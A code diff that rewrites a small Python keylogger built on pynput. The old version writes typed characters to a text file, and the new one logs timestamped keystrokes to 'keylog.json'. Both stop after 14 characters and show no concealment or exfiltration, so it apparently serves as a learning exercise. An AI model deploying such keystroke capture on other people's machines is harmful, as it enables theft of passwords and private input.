@@ -1,24 +1,17 @@
-from pynput import keyboard
-
-f = open("Keyloggerfile.txt", "w")
-counter = 0  # Initialize a counter for characters typed
-
-def main(key):
-    global counter #counter value preserved during all the script's run 
-    try:
-        f.write(key.char)
-        counter += 1  # Increment the counter for each character typed
-
-        # Check if 14 characters have been typed, if yes, stop listening
-        if counter >= 14:
-            print("14 characters reached. Stopping.")
-            return False
-
-    except AttributeError:
-        f.write(f' [str{key}] ')
-
-
-with keyboard.Listener(on_press=main) as listener:
+from pynput.keyboard import Key, Listener
+import logging
+ 
+logging.basicConfig(filename="keylog.json", level=logging.DEBUG, format="%(asctime)s - %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
+counter = 0
+ 
+def on_press(key):
+    global counter
+    counter += 1
+    if counter >= 14:
+        print("14 characters reached. Stopping.")  
+        return False
+    
+    logging.info(str(key))
+ 
+with Listener(on_press=on_press) as listener :
     listener.join()
-
-f.close()
